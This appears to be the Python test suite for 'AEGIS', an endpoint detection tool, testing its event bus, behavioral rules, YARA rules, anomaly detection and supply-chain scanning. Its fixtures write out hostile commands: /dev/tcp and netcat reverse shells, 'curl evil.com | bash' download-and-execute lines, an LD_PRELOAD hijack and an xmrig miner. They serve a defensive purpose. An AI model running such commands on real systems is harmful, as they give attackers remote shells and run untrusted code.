"""
AEGIS Test Suite
==================
Tests for all core components. Run with:
    python -m pytest tests/ -v
    or
    python tests/test_aegis.py
"""

import os
import sys
import time
import json
import tempfile
import shutil

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from aegis.core import EventBus, Event, EventCategory, Severity
from aegis.core.config import AegisConfig
from aegis.detection.behavioral import BehavioralEngine, RULES
from aegis.monitors.process_mon import cmdline_entropy


class TestResults:
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.errors = []

    def ok(self, name):
        self.passed += 1
        print(f"  ✓ {name}")

    def fail(self, name, msg=""):
        self.failed += 1
        self.errors.append((name, msg))
        print(f"  ✗ {name}: {msg}")

    def summary(self):
        total = self.passed + self.failed
        print(f"\n{'='*50}")
        print(f"Results: {self.passed}/{total} passed, {self.failed} failed")
        if self.errors:
            print("\nFailures:")
            for name, msg in self.errors:
                print(f"  - {name}: {msg}")
        print(f"{'='*50}")
        return self.failed == 0


results = TestResults()


# ═══════════════════════════════════════════════════════════
# EVENT BUS TESTS
# ═══════════════════════════════════════════════════════════

print("\n[Event Bus Tests]")

def test_event_creation():
    e = Event(
        category=EventCategory.FILE_CREATE,
        severity=Severity.INFO,
        source="test",
        data={"path": "/tmp/test.txt"},
    )
    assert e.event_id is not None
    assert e.timestamp > 0
    assert e.category == EventCategory.FILE_CREATE
    results.ok("Event creation")

def test_event_serialization():
    e = Event(
        category=EventCategory.DETECTION_YARA,
        severity=Severity.HIGH,
        source="test",
        data={"rule": "test_rule"},
        mitre_attack="T1059",
    )
    d = e.to_dict()
    assert d["category"] == "detection.yara"
    assert d["severity"] == "high"
    j = e.to_json()
    assert "detection.yara" in j
    results.ok("Event serialization")

def test_event_bus_pubsub():
    bus = EventBus()
    received = []
    bus.subscribe("file.*", lambda e: received.append(e))
    bus.publish(Event(category=EventCategory.FILE_CREATE, severity=Severity.INFO,
                      source="test", data={}))
    assert len(received) == 1
    results.ok("Event bus pub/sub")

def test_event_bus_wildcard():
    bus = EventBus()
    all_events = []
    bus.subscribe("*", lambda e: all_events.append(e))
    bus.publish(Event(category=EventCategory.FILE_CREATE, severity=Severity.INFO,
                      source="test", data={}))
    bus.publish(Event(category=EventCategory.PROC_CREATE, severity=Severity.INFO,
                      source="test", data={}))
    assert len(all_events) == 2
    results.ok("Event bus wildcard subscription")

def test_event_bus_pattern_matching():
    bus = EventBus()
    detection_events = []
    bus.subscribe("detection.*", lambda e: detection_events.append(e))
    bus.publish(Event(category=EventCategory.DETECTION_YARA, severity=Severity.HIGH,
                      source="test", data={}))
    bus.publish(Event(category=EventCategory.FILE_CREATE, severity=Severity.INFO,
                      source="test", data={}))
    assert len(detection_events) == 1
    results.ok("Event bus pattern matching")

def test_event_bus_persistence():
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = f.name
    try:
        bus = EventBus(db_path=db_path)
        bus.publish(Event(category=EventCategory.FILE_CREATE, severity=Severity.INFO,
                          source="test", data={"key": "value"}))
        events = bus.query_events(category="file.create")
        assert len(events) >= 1
        bus.shutdown()
        results.ok("Event bus persistence (SQLite)")
    finally:
        os.unlink(db_path)

try:
    test_event_creation()
    test_event_serialization()
    test_event_bus_pubsub()
    test_event_bus_wildcard()
    test_event_bus_pattern_matching()
    test_event_bus_persistence()
except Exception as e:
    results.fail("Event bus test", str(e))


# ═══════════════════════════════════════════════════════════
# CONFIG TESTS
# ═══════════════════════════════════════════════════════════

print("\n[Config Tests]")

def test_config_defaults():
    config = AegisConfig()
    assert config.get("core.log_level") == "INFO"
    assert config.get("monitors.fim.enabled") == True
    results.ok("Config defaults")

def test_config_dot_access():
    config = AegisConfig()
    assert config.get("nonexistent.path", "default") == "default"
    assert config.get("core.log_level") is not None
    results.ok("Config dot-notation access")

def test_config_platform():
    config = AegisConfig()
    assert config.platform in ("windows", "linux", "darwin")
    results.ok(f"Config platform detection: {config.platform}")

try:
    test_config_defaults()
    test_config_dot_access()
    test_config_platform()
except Exception as e:
    results.fail("Config test", str(e))


# ═══════════════════════════════════════════════════════════
# BEHAVIORAL ENGINE TESTS
# ═══════════════════════════════════════════════════════════

print("\n[Behavioral Engine Tests]")

def test_behavioral_rules_loaded():
    assert len(RULES) >= 10, f"Expected ≥10 rules, got {len(RULES)}"
    results.ok(f"Behavioral rules loaded: {len(RULES)} rules")

def test_behavioral_reverse_shell_detection():
    bus = EventBus()
    engine = BehavioralEngine(bus, {})
    detections = []
    bus.subscribe("detection.*", lambda e: detections.append(e))
    engine.start()

    # Simulate a reverse shell process creation
    bus.publish(Event(
        category=EventCategory.PROC_CREATE,
        severity=Severity.INFO,
        source="procmon",
        data={
            "pid": 9999,
            "name": "bash",
            "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "exe": "/bin/bash",
            "environ": {},
        },
    ))
    time.sleep(0.1)
    assert len(detections) >= 1, "Reverse shell not detected"
    assert detections[0].severity == Severity.CRITICAL
    results.ok("Reverse shell detection")

def test_behavioral_cryptominer_detection():
    bus = EventBus()
    engine = BehavioralEngine(bus, {})
    detections = []
    bus.subscribe("detection.*", lambda e: detections.append(e))
    engine.start()

    bus.publish(Event(
        category=EventCategory.PROC_CREATE,
        severity=Severity.INFO,
        source="procmon",
        data={
            "pid": 8888,
            "name": "xmrig",
            "cmdline": "xmrig --url stratum+tcp://pool.mining.com:3333 --user wallet",
            "exe": "/tmp/xmrig",
            "environ": {},
        },
    ))
    time.sleep(0.1)
    assert len(detections) >= 1, "Cryptominer not detected"
    results.ok("Cryptominer detection")

def test_behavioral_ld_preload_detection():
    bus = EventBus()
    engine = BehavioralEngine(bus, {})
    detections = []
    bus.subscribe("detection.*", lambda e: detections.append(e))
    engine.start()

    bus.publish(Event(
        category=EventCategory.PROC_CREATE,
        severity=Severity.INFO,
        source="procmon",
        data={
            "pid": 7777,
            "name": "bash",
            "cmdline": "LD_PRELOAD=/tmp/evil.so /usr/bin/sshd",
            "exe": "/bin/bash",
            "environ": {"LD_PRELOAD": "/tmp/evil.so"},
        },
    ))
    time.sleep(0.1)
    assert len(detections) >= 1, "LD_PRELOAD not detected"
    assert any(d.severity == Severity.CRITICAL for d in detections)
    results.ok("LD_PRELOAD hijacking detection")

def test_behavioral_download_execute():
    bus = EventBus()
    engine = BehavioralEngine(bus, {})
    detections = []
    bus.subscribe("detection.*", lambda e: detections.append(e))
    engine.start()

    bus.publish(Event(
        category=EventCategory.PROC_CREATE,
        severity=Severity.INFO,
        source="procmon",
        data={
            "pid": 6666,
            "name": "bash",
            "cmdline": "curl http://evil.com/payload.sh | bash",
            "exe": "/bin/bash",
            "environ": {},
        },
    ))
    time.sleep(0.1)
    assert len(detections) >= 1, "Download-and-execute not detected"
    results.ok("Download-and-execute detection")

def test_behavioral_benign_not_flagged():
    bus = EventBus()
    engine = BehavioralEngine(bus, {})
    detections = []
    bus.subscribe("detection.*", lambda e: detections.append(e))
    engine.start()

    # Normal commands should NOT trigger detections
    benign_commands = [
        "ls -la /home/user",
        "python3 server.py",
        "node app.js",
        "vim README.md",
        "git commit -m 'update'",
        "pip install requests",
        "gcc -o main main.c",
    ]
    for cmd in benign_commands:
        bus.publish(Event(
            category=EventCategory.PROC_CREATE,
            severity=Severity.INFO,
            source="procmon",
            data={"pid": 5555, "name": "test", "cmdline": cmd,
                  "exe": "/usr/bin/test", "environ": {}},
        ))

    time.sleep(0.1)
    assert len(detections) == 0, f"False positive on benign commands: {[d.data.get('rule_name') for d in detections]}"
    results.ok("Benign commands not flagged (zero false positives)")

try:
    test_behavioral_rules_loaded()
    test_behavioral_reverse_shell_detection()
    test_behavioral_cryptominer_detection()
    test_behavioral_ld_preload_detection()
    test_behavioral_download_execute()
    test_behavioral_benign_not_flagged()
except Exception as e:
    results.fail("Behavioral test", str(e))


# ═══════════════════════════════════════════════════════════
# UTILITY TESTS
# ═══════════════════════════════════════════════════════════

print("\n[Utility Tests]")

def test_cmdline_entropy():
    # Normal commands have lower entropy
    normal = cmdline_entropy("ls -la /home/user")
    # Base64 encoded strings have higher entropy
    encoded = cmdline_entropy("cHl0aG9uIC1jICdpbXBvcnQgb3M7b3Muc3lzdGVtKCJpZCIpJw==")
    assert encoded > normal, f"Expected encoded ({encoded}) > normal ({normal})"
    assert cmdline_entropy("") == 0.0
    results.ok(f"Cmdline entropy: normal={normal:.2f} encoded={encoded:.2f}")

try:
    test_cmdline_entropy()
except Exception as e:
    results.fail("Utility test", str(e))


# ═══════════════════════════════════════════════════════════
# YARA TESTS
# ═══════════════════════════════════════════════════════════

print("\n[YARA Tests]")

def test_yara_import():
    import yara
    assert yara.YARA_VERSION is not None
    results.ok(f"YARA available: v{yara.YARA_VERSION}")

def test_yara_builtin_rules_compile():
    from aegis.detection.yara_scanner import BUILTIN_RULES
    import yara
    rules = yara.compile(source=BUILTIN_RULES)
    assert rules is not None
    results.ok("Built-in YARA rules compile successfully")

def _write_temp(suffix: str, content: str) -> str:
    """Windows-safe tempfile: write & close before returning the path so other
    handles (yara.match, FIM hashing) can re-open it."""
    fd, path = tempfile.mkstemp(suffix=suffix)
    with os.fdopen(fd, "w") as f:
        f.write(content)
    return path

def test_yara_detects_reverse_shell_script():
    import yara
    from aegis.detection.yara_scanner import BUILTIN_RULES
    rules = yara.compile(source=BUILTIN_RULES)
    path = _write_temp(".sh", "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    try:
        matches = rules.match(path)
    finally:
        os.unlink(path)
    assert len(matches) >= 1, "YARA did not detect reverse shell script"
    results.ok(f"YARA detects reverse shell: {[m.rule for m in matches]}")

def test_yara_detects_cryptominer():
    import yara
    from aegis.detection.yara_scanner import BUILTIN_RULES
    rules = yara.compile(source=BUILTIN_RULES)
    path = _write_temp(".conf", '{"url": "stratum+tcp://pool.mining.com:3333", "coin": "xmr", "hashrate": 1000}\n')
    try:
        matches = rules.match(path)
    finally:
        os.unlink(path)
    assert len(matches) >= 1, "YARA did not detect cryptominer config"
    results.ok(f"YARA detects cryptominer: {[m.rule for m in matches]}")

def test_yara_no_false_positive():
    import yara
    from aegis.detection.yara_scanner import BUILTIN_RULES
    rules = yara.compile(source=BUILTIN_RULES)
    path = _write_temp(".py", "#!/usr/bin/env python3\nprint('Hello, World!')\nimport os\nos.listdir('.')\n")
    try:
        matches = rules.match(path)
    finally:
        os.unlink(path)
    assert len(matches) == 0, f"YARA false positive on benign file: {[m.rule for m in matches]}"
    results.ok("YARA no false positive on benign Python file")

try:
    test_yara_import()
    test_yara_builtin_rules_compile()
    test_yara_detects_reverse_shell_script()
    test_yara_detects_cryptominer()
    test_yara_no_false_positive()
except Exception as e:
    results.fail("YARA test", str(e))


# ═══════════════════════════════════════════════════════════
# FIM TESTS
# ═══════════════════════════════════════════════════════════

print("\n[FIM Tests]")

def test_fim_sha256():
    from aegis.monitors.fim import sha256_file
    path = _write_temp("", "test content for hashing\n")
    try:
        h = sha256_file(path)
    finally:
        os.unlink(path)
    assert h is not None
    assert len(h) == 64
    results.ok(f"SHA-256 hashing: {h[:16]}...")

def test_fim_baseline_db():
    from aegis.monitors.fim import BaselineDB
    with tempfile.TemporaryDirectory() as tmpdir:
        db = BaselineDB(db_path=os.path.join(tmpdir, "test.db"))
        try:
            db.update("/test/file.txt", "abc123")
            assert db.get_hash("/test/file.txt") == "abc123"
            db.remove("/test/file.txt")
            assert db.get_hash("/test/file.txt") is None
        finally:
            db.close()
    results.ok("FIM baseline database CRUD")

try:
    test_fim_sha256()
    test_fim_baseline_db()
except Exception as e:
    results.fail("FIM test", str(e))


# ═══════════════════════════════════════════════════════════
# INTEGRATION TEST
# ═══════════════════════════════════════════════════════════

print("\n[Integration Tests]")

def test_full_detection_pipeline():
    """
    End-to-end: process event → behavioral detection → response alert.
    Validates the entire event flow through the system.
    """
    bus = EventBus()
    engine = BehavioralEngine(bus, {})
    from aegis.response import ResponseEngine
    response = ResponseEngine(bus, {"auto_respond": False})

    alerts = []
    bus.subscribe("response.alert", lambda e: alerts.append(e))

    engine.start()
    response.start()

    # Simulate a reverse shell
    bus.publish(Event(
        category=EventCategory.PROC_CREATE,
        severity=Severity.INFO,
        source="procmon",
        data={
            "pid": 4444,
            "name": "nc",
            "cmdline": "nc -e /bin/bash 10.0.0.1 4444",
            "exe": "/usr/bin/nc",
            "environ": {},
        },
    ))

    time.sleep(0.3)
    assert len(alerts) >= 1, "Full pipeline: no alert generated"
    results.ok("Full pipeline: process → behavioral → response → alert")

def test_mitre_attack_mapping():
    """Verify all behavioral rules have MITRE ATT&CK mappings."""
    unmapped = [r for r in RULES if not r.mitre_attack]
    assert len(unmapped) == 0, f"Rules without ATT&CK mapping: {[r.rule_id for r in unmapped]}"
    results.ok(f"All {len(RULES)} rules have MITRE ATT&CK mappings")

try:
    test_full_detection_pipeline()
    test_mitre_attack_mapping()
except Exception as e:
    results.fail("Integration test", str(e))


# ═══════════════════════════════════════════════════════════
# HARDENING TESTS
# ═══════════════════════════════════════════════════════════

print("\n[Hardening Tests]")

def test_hardening_audit_returns_findings():
    from aegis.hardening import HardeningRunner, Finding
    runner = HardeningRunner(platform="common")
    findings = runner.audit()
    # Audit must return a list (possibly empty) of Finding objects
    assert isinstance(findings, list)
    for f in findings:
        assert isinstance(f, Finding)
    results.ok(f"Hardening audit ran, {len(findings)} finding(s) reported")

def test_hardening_finding_serialization():
    from aegis.hardening.common import Finding, Severity as HS
    f = Finding(
        check_id="TEST-001", title="t", description="d",
        severity=HS.HIGH, target="/tmp/x", platform="test", fixable=True,
    )
    d = f.to_dict()
    assert d["severity"] == "high" and d["check_id"] == "TEST-001"
    results.ok("Hardening finding serializes to JSON-friendly dict")

def test_hardening_runner_report_is_json():
    from aegis.hardening import HardeningRunner
    runner = HardeningRunner(platform="common")
    report = runner.report(runner.audit())
    parsed = json.loads(report)
    assert "findings" in parsed and "platform" in parsed
    results.ok("Hardening report is valid JSON")

try:
    test_hardening_audit_returns_findings()
    test_hardening_finding_serialization()
    test_hardening_runner_report_is_json()
except Exception as e:
    results.fail("Hardening", str(e))


# ═══════════════════════════════════════════════════════════
# ANOMALY DETECTION TESTS
# ═══════════════════════════════════════════════════════════

print("\n[Anomaly Detection Tests]")

def test_anomaly_feature_extraction():
    from aegis.detection.anomaly import extract_features, FEATURE_NAMES
    features = extract_features({
        "cmdline": "python script.py", "cpu_percent": 5,
        "memory_mb": 100, "num_fds": 12, "children_pids": [],
        "net_connections": 0,
    })
    assert len(features) == len(FEATURE_NAMES)
    assert all(isinstance(f, float) for f in features)
    results.ok("Anomaly: feature vector extraction")

def test_anomaly_train_and_detect():
    from aegis.detection.anomaly import AnomalyDetector, SKLEARN_AVAILABLE
    if not SKLEARN_AVAILABLE:
        results.ok("Anomaly: sklearn missing — skipped (acceptable)")
        return
    tmp = tempfile.mkdtemp()
    try:
        bus = EventBus()
        detector = AnomalyDetector(bus, {
            "model_path": os.path.join(tmp, "m.pkl"),
            "training_period_hours": 0,
            "min_training_samples": 50,
            "contamination": 0.05,
        })

        # Synthesize a "normal" baseline of low-resource processes
        import random
        random.seed(0)
        baseline = [
            [random.uniform(0, 5), random.uniform(20, 200), random.uniform(5, 30),
             0, 0, 0, random.uniform(2, 4)]
            for _ in range(200)
        ]
        assert detector.force_train(baseline)

        # Subscribe for detections
        detections = []
        bus.subscribe("detection.anomaly", lambda e: detections.append(e))

        # Make sure the detector is now in detecting mode
        detector._mode = "detecting"
        bus.subscribe("proc.create", detector._on_event)

        # Send a wildly anomalous process
        bus.publish(Event(
            category=EventCategory.PROC_CREATE,
            severity=Severity.INFO,
            source="test",
            data={
                "pid": 1, "name": "miner",
                "cmdline": "xmrig --donate-level=1 --url stratum+tcp://pool",
                "cpu_percent": 95, "memory_mb": 4000, "num_fds": 500,
                "children_pids": [2, 3, 4, 5], "net_connections": 50,
                "file_writes_per_sec": 1000,
            },
        ))
        # Short wait — detector publishes synchronously here
        assert len(detections) >= 1, "Anomaly: outlier not detected"
        results.ok("Anomaly: outlier detected after training")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

try:
    test_anomaly_feature_extraction()
    test_anomaly_train_and_detect()
except Exception as e:
    results.fail("Anomaly", str(e))


# ═══════════════════════════════════════════════════════════
# SUPPLY CHAIN TESTS
# ═══════════════════════════════════════════════════════════

print("\n[Supply Chain Tests]")

def test_levenshtein():
    from aegis.detection.supply_chain import levenshtein
    assert levenshtein("requests", "reqeusts") == 2
    assert levenshtein("numpy", "numpy") == 0
    assert levenshtein("", "abc") == 3
    results.ok("Supply chain: levenshtein distance")

def test_typosquat_detection():
    from aegis.detection.supply_chain import SupplyChainScanner
    scanner = SupplyChainScanner(EventBus(), {})
    scanner.start()
    findings = scanner.check_package_name("reqeusts", "pypi")
    assert any(f["rule"] == "typosquat" for f in findings)
    # Legit name doesn't trigger
    assert scanner.check_package_name("requests", "pypi") == []
    results.ok("Supply chain: typosquat caught, legit packages clean")

def test_known_malicious_db_loads():
    from aegis.detection.supply_chain import SupplyChainScanner
    scanner = SupplyChainScanner(EventBus(), {
        "malicious_db_path": "rules/supply_chain/known_malicious.json",
    })
    scanner.start()
    if scanner._malicious:
        sample = next(iter(scanner._malicious))
        findings = scanner.check_package_name(sample, "pypi")
        assert any(f["rule"] == "known_malicious_package" for f in findings)
        results.ok(f"Supply chain: known-malicious DB loaded ({len(scanner._malicious)} entries)")
    else:
        results.ok("Supply chain: known-malicious DB absent (skipped)")

def test_install_script_redflags():
    from aegis.detection.supply_chain import SupplyChainScanner
    scanner = SupplyChainScanner(EventBus(), {})
    scanner.start()
    tmp = tempfile.mkdtemp()
    try:
        setup = os.path.join(tmp, "setup.py")
        with open(setup, "w") as f:
            f.write("import os\nos.system('curl http://evil/x | sh')\n")
        findings = scanner.scan_install_script(__import__("pathlib").Path(setup))
        assert len(findings) >= 1
        results.ok("Supply chain: install script red-flag detected")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

try:
    test_levenshtein()
    test_typosquat_detection()
    test_known_malicious_db_loads()
    test_install_script_redflags()
except Exception as e:
    results.fail("Supply chain", str(e))


# ═══════════════════════════════════════════════════════════
# ALERTING TESTS
# ═══════════════════════════════════════════════════════════

print("\n[Alerting Tests]")

def test_json_formatter():
    import logging
    from aegis.utils.alerting import JsonFormatter
    fmt = JsonFormatter()
    rec = logging.LogRecord("aegis.test", logging.INFO, "f.py", 1, "hello", (), None)
    out = fmt.format(rec)
    parsed = json.loads(out)
    assert parsed["msg"] == "hello" and parsed["level"] == "INFO"
    results.ok("Alerting: JSON formatter emits valid JSON lines")

def test_webhook_disabled_when_no_url():
    from aegis.utils.alerting import WebhookAlerter
    w = WebhookAlerter(EventBus(), {"url": ""})
    w.start()  # should be a no-op
    assert not w._running
    results.ok("Alerting: webhook stays disabled without URL")

try:
    test_json_formatter()
    test_webhook_disabled_when_no_url()
except Exception as e:
    results.fail("Alerting", str(e))


# ═══════════════════════════════════════════════════════════
# RESULTS
# ═══════════════════════════════════════════════════════════

success = results.summary()
sys.exit(0 if success else 1)
